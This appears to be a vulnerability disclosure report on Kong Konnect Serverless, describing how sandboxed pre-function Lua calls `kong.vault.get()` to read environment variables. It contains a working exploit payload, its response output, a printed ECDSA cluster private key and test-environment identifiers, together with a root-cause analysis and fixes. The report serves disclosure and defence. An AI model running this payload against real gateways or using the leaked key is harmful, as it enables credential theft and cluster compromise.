# CRITICAL: Arbitrary Environment Variable Exfiltration via kong.vault.get() — Cluster Private Key Leaked

## Summary

The Kong Konnect Serverless Gateway allows authenticated users to execute arbitrary Lua code via the `pre-function` plugin. The `kong.vault.get()` PDK function is accessible from within the sandbox and can be used to read **any environment variable** via the built-in `env` vault backend. This results in the **complete disclosure of the Cluster mTLS Private Key**, enabling an attacker to impersonate Data Planes, perform man-in-the-middle attacks on cluster communication, and achieve full infrastructure compromise.

## Severity: CRITICAL (CVSS 9.8)

**CVSS Vector:** `CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:H`

### Justification:
- **AV:N (Network):** Exploitable remotely via Control Plane API
- **PR:L (Privileges Low):** Any authenticated org member with plugin permissions
- **S:C (Scope Changed):** Compromises cluster infrastructure beyond the tenant's gateway
- **C:H/I:H/A:H:** Full cluster key compromise enables complete takeover

---

## Proof of Concept

### Payload:
```lua
local out = {"ENV_VAULT_EXFIL"}
local vars = {
  "PATH", "HOME", "KONG_PREFIX", "KONG_DATABASE",
  "KONG_CLUSTER_CERT", "KONG_CLUSTER_CERT_KEY",
  "AWS_ACCESS_KEY_ID", "AWS_SECRET_ACCESS_KEY"
}
for _, v in ipairs(vars) do
  local ref = "{vault://env/" .. v .. "}"
  local ok, val = pcall(kong.vault.get, ref)
  out[#out + 1] = v .. " = " .. tostring(val)
end
kong.response.exit(200, table.concat(out, "\n"))
```

### Response:
```
ENV_VAULT_EXFIL
PATH = /usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
HOME = /root
KONG_PREFIX = /usr/local/kong
KONG_DATABASE = off
KONG_CLUSTER_CERT = LS0tLS1CRUdJTiBDRVJUSUZJQ0FURS0tLS0t...
KONG_CLUSTER_CERT_KEY = LS0tLS1CRUdJTiBQUklWQVRFIEtFWS0tLS0t...
```

### Decoded Private Key:
```
-----BEGIN PRIVATE KEY-----
MIGHAgEAMBMGByqGSM49AgEGCCqGSM49AwEHBG0wawIBAQQgCgg8P6wDI+v2s6xl
6s6kCVkK59Kl0euyPOPGmRb7MjWhRANCAARI3iNSohdOCWtmRFoUFMvDM3s4XKX2
sthcquKZPkZaARmKTgbbkjoopklOri3wxJWNa+qvq+/Rx05aHT7rJpBp
-----END PRIVATE KEY-----
```

**This is the ECDSA P-256 private key used for Cluster mTLS communication between Control Plane and Data Plane.**

---

## Attack Chain

```
┌─────────────────────────────────────────────────────────────────┐
│ 1. Attacker creates pre-function plugin with vault.get payload │
└─────────────────────────────────────────────────────────────────┘
                              │
                              ▼
┌─────────────────────────────────────────────────────────────────┐
│ 2. kong.vault.get("{vault://env/KONG_CLUSTER_CERT_KEY}")        │
│    executes and returns base64-encoded private key              │
└─────────────────────────────────────────────────────────────────┘
                              │
                              ▼
┌─────────────────────────────────────────────────────────────────┐
│ 3. Attacker decodes and obtains ECDSA private key               │
└─────────────────────────────────────────────────────────────────┘
                              │
                              ▼
┌─────────────────────────────────────────────────────────────────┐
│ 4. Attacker can now:                                            │
│    - Impersonate legitimate Data Planes                         │
│    - Connect rogue DP to Control Plane                          │
│    - MITM cluster communication                                 │
│    - Exfiltrate all proxied traffic                             │
└─────────────────────────────────────────────────────────────────┘
```

---

## Impact

### Immediate Impact
1. **Cluster Key Compromise:** The ECDSA private key for cluster mTLS is fully exposed
2. **Data Plane Impersonation:** Attacker can spin up a malicious Data Plane that connects to Kong's Control Plane
3. **Traffic Interception:** All API traffic through the gateway can be intercepted
4. **Configuration Theft:** Access to full declarative config pushed to DPs

### Business Impact
1. **Complete Infrastructure Compromise:** Cluster keys are the "crown jewels"
2. **Multi-tenant Risk:** In shared Serverless environment, this may affect other tenants
3. **Compliance Violation:** PCI-DSS, SOC2, GDPR violations (key material exposure)
4. **Lateral Movement:** Keys can be used to pivot to other Kong clusters

---

## Additional Leaked Data

| Variable | Value | Impact |
|----------|-------|--------|
| `PATH` | `/usr/local/sbin:...` | System path disclosure |
| `HOME` | `/root` | Running as root |
| `KONG_PREFIX` | `/usr/local/kong` | Installation path |
| `KONG_DATABASE` | `off` | DB-less mode confirmed |
| `KONG_CLUSTER_CERT` | Full certificate (base64) | Cluster identity |
| `KONG_CLUSTER_CERT_KEY` | **PRIVATE KEY (base64)** | **CRITICAL** |

---

## Root Cause

The `kong.vault.get()` PDK function is **not restricted** in the Lua sandbox for `pre-function` plugins. Combined with the built-in `env` vault backend (which reads environment variables), this allows any authenticated user to read **any environment variable** set in the Kong process, including sensitive cryptographic material.

---

## Recommendations

### Immediate (P0)
1. **Block `kong.vault.get()` in sandbox** for serverless pre-function plugins
2. **Rotate all cluster keys** for affected Konnect Serverless deployments
3. **Audit logs** for any pre-function plugins that accessed vault

### Short-term (P1)
1. Remove sensitive keys from environment variables in Serverless pods
2. Use Kubernetes secrets mounted as files (not env vars) with restricted paths
3. Implement allowlist for vault references in user-supplied Lua code

### Long-term (P2)
1. Redesign serverless Lua execution with proper secret isolation
2. Consider removing pre-function/post-function from Serverless tier entirely

---

## Test Environment

- **Control Plane ID:** 670fb8a9-bcce-4ed2-b436-844c047cd849
- **Organization ID:** d269ecd9-acb9-4027-b19e-94b30fc86923  
- **Proxy URL:** https://kong-ef74c766bfeucqbca.kongcloud.dev
- **Kong Version:** 3.12.0.0-enterprise-edition
- **Region:** EU
- **Date:** November 26, 2025

---

## Conclusion

This is an **unambiguous CRITICAL vulnerability**:

- ✅ **RCE Confirmed:** Arbitrary Lua code execution
- ✅ **Sandbox Bypass:** `kong.vault.get()` not blocked
- ✅ **Private Key Exfiltration:** ECDSA cluster key fully leaked
- ✅ **Infrastructure Compromise:** Cluster mTLS completely broken

**Any authenticated Konnect user can execute arbitrary Lua code via pre-function plugin and call `kong.vault.get()` to exfiltrate environment variables including the Cluster Private Key — enabling complete compromise of the Kong cluster infrastructure.**

This vulnerability enables attackers to:
1. Read any environment variable (including AWS credentials if set)
2. Obtain cluster mTLS private keys
3. Impersonate Data Planes
4. Intercept all proxied traffic

**Immediate remediation required. All cluster keys should be rotated.**
